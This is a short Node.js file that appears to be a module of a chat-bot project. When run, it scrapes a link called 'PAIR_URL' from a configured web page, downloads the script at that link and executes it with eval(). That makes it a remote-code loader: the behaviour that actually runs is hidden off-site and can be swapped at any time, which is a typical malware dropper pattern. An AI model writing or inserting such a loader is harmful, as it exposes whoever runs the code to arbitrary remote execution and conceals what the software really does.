'use strict';

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchPairUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const pairUrlElement = $('a:contains("PAIR_URL")');
    const pairUrl = pairUrlElement.attr('href');

    if (!pairUrl) {
      throw new Error('Pair URL link not found...');
    }

    console.log('Pair URL fetched successfully ✅');

    const scriptResponse = await axios.get(pairUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchPairUrl();
